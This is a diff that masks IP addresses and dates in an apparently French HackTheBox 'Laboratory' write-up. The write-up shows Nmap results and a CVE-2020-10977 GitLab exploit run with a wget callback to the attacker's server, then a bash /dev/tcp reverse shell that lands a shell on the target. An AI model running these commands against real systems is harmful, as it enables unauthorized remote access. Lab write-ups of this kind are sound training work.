@@ -226,8 +226,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 443/tcp)
 HOP RTT      ADDRESS
-1   53.93 ms 10.10.16.1
-2   53.98 ms laboratory.htb (10.129.6.88)
+1   53.93 ms 10.10.x.1
+2   53.98 ms laboratory.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at [date] -- 1 IP address (1 host up) scanned in 24.88 seconds
@@ -260,7 +260,7 @@ PORT    STATE SERVICE  VERSION
 |   Total files found (by extension):
 |_    
 | http-headers: 
-|   Date: Fri, 29 May 2026 08:10:55 GMT
+|   Date: [date]
 |   Server: Apache/2.4.41 (Ubuntu)
 |   Location: https://laboratory.htb/
 |   Content-Length: 287
@@ -273,7 +273,7 @@ PORT    STATE SERVICE  VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: The Laboratory
 | http-headers: 
-|   Date: Fri, 29 May 2026 08:10:55 GMT
+|   Date: [date]
 |   Server: Apache/2.4.41 (Ubuntu)
 |   Last-Modified: Sun, 05 Jul 2020 16:42:54 GMT
 |   ETag: "1c56-5a9b4731c5f80"
@@ -604,7 +604,7 @@ python3 -m http.server 8000
 Ensuite, tu relances l’exploit en ajoutant une commande `wget` :
 
 ```bash
-python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "wget http://10.10.16.20:8000/test.txt" 
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "wget http://10.10.x.x:8000/test.txt" 
 ```
 
 Si l’exécution de commande fonctionne, le serveur HTTP lancé sur Kali reçoit une requête depuis la cible :
@@ -612,7 +612,7 @@ Si l’exécution de commande fonctionne, le serveur HTTP lancé sur Kali reçoi
 ```bash
 python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.129.8.117 - - [01/Jun/2026 16:57:39] "GET /test.txt HTTP/1.1" 200 -
+10.129.x.x - - [date] "GET /test.txt HTTP/1.1" 200 -
 ```
 
 Ce test confirme que l’exploit permet bien d’exécuter une commande sur la machine cible. Tu peux maintenant remplacer la commande `wget` par une commande destinée à établir un reverse shell vers Kali.
@@ -630,7 +630,7 @@ rlwrap nc -lvnp 4444
 Tu relances ensuite l’exploit en utilisant l’option `--cmd` pour exécuter un reverse shell vers ton IP VPN HTB :
 
 ```bash
-python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'"
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p 'Password123!' --insecure --cmd "bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'"
 ```
 
 Dans cette commande, l’exploit se connecte à GitLab avec le compte créé précédemment, puis utilise l’exécution de commande pour lancer un shell Bash vers Kali.
@@ -639,7 +639,7 @@ Si tout se passe correctement, le listener reçoit une connexion entrante :
 
 ```bash
 listening on [any] 4444 ...
-connect to [10.10.16.20] from (UNKNOWN) [10.129.8.117] 35368
+connect to [10.10.x.x] from (UNKNOWN) [10.129.x.x] 35368
 bash: cannot set terminal process group (413): Inappropriate ioctl for device
 bash: no job control in this shell
 git@git:~/gitlab-rails/working$ 
